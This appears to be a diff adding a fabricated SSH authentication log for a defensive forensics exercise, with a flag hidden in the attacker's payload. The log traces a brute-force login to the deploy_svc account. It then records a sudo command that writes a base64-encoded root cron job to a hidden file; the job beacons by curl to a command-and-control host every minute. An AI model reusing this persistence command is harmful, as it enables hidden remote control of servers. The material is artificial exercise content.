@@ -1,0 +1,28 @@
+Nov 18 02:04:12 srv-web-01 sshd[1840]: Accepted publickey for devops_admin from 10.0.4.15 port 49112 ssh2: RSA SHA256:kL9mP2xQ8vR1tZ7yB4nC0wM5eJ
+Nov 18 02:04:12 srv-web-01 sshd[1840]: pam_unix(sshd:session): session opened for user devops_admin(uid=1001) by (uid=0)
+Nov 18 02:06:19 srv-web-01 sudo: devops_admin : TTY=pts/0 ; PWD=/home/devops_admin ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Nov 18 02:08:45 srv-web-01 sshd[1840]: pam_unix(sshd:session): session closed for user devops_admin
+Nov 18 02:10:01 srv-web-01 CRON[1902]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 18 02:10:02 srv-web-01 CRON[1902]: pam_unix(cron:session): session closed for user root
+Nov 18 02:18:11 srv-web-01 sshd[2101]: Invalid user admin from 185.220.101.47 port 54102
+Nov 18 02:18:13 srv-web-01 sshd[2101]: Failed password for invalid user admin from 185.220.101.47 port 54102 ssh2
+Nov 18 02:18:15 srv-web-01 sshd[2101]: Connection closed by invalid user admin 185.220.101.47 port 54102 [preauth]
+Nov 18 02:18:22 srv-web-01 sshd[2114]: Failed password for root from 185.220.101.47 port 54118 ssh2
+Nov 18 02:18:25 srv-web-01 sshd[2114]: Failed password for root from 185.220.101.47 port 54118 ssh2
+Nov 18 02:18:28 srv-web-01 sshd[2114]: Failed password for root from 185.220.101.47 port 54118 ssh2
+Nov 18 02:18:29 srv-web-01 sshd[2114]: Disconnecting authenticating user root 185.220.101.47 port 54118: Too many authentication failures [preauth]
+Nov 18 02:19:02 srv-web-01 sshd[2129]: Invalid user ubuntu from 185.220.101.47 port 54144
+Nov 18 02:19:04 srv-web-01 sshd[2129]: Failed password for invalid user ubuntu from 185.220.101.47 port 54144 ssh2
+Nov 18 02:19:18 srv-web-01 sshd[2141]: Invalid user postgres from 185.220.101.47 port 54189
+Nov 18 02:19:20 srv-web-01 sshd[2141]: Failed password for invalid user postgres from 185.220.101.47 port 54189 ssh2
+Nov 18 02:20:01 srv-web-01 CRON[2160]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 18 02:20:02 srv-web-01 CRON[2160]: pam_unix(cron:session): session closed for user root
+Nov 18 02:20:41 srv-web-01 sshd[2180]: Failed password for deploy_svc from 185.220.101.47 port 54210 ssh2
+Nov 18 02:20:44 srv-web-01 sshd[2180]: Failed password for deploy_svc from 185.220.101.47 port 54210 ssh2
+Nov 18 02:21:07 srv-web-01 sshd[2194]: Accepted password for deploy_svc from 185.220.101.47 port 54322 ssh2
+Nov 18 02:21:07 srv-web-01 sshd[2194]: pam_unix(sshd:session): session opened for user deploy_svc(uid=1004) by (uid=0)
+Nov 18 02:30:11 srv-web-01 sudo: deploy_svc : TTY=pts/1 ; PWD=/var/www/html/uploads ; USER=root ; COMMAND=/usr/bin/id
+Nov 18 02:31:09 srv-web-01 sudo: deploy_svc : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c echo KiAqICogKiAqIHJvb3QgY3VybCAtZnNTTCBodHRwczovL2MyLmtyaXB0by1rb250cm9sLm5ldC9oZWFydGJlYXQ/aWQ9RkxBR3tibHVlX3NvY19vbGF5XzIwMjZ9 | base64 -d > /etc/cron.d/.sys_sync
+Nov 18 02:33:40 srv-web-01 sshd[2194]: pam_unix(sshd:session): session closed for user deploy_svc
+Nov 18 02:35:01 srv-web-01 CRON[2240]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 18 02:35:02 srv-web-01 CRON[2240]: pam_unix(cron:session): session closed for user root
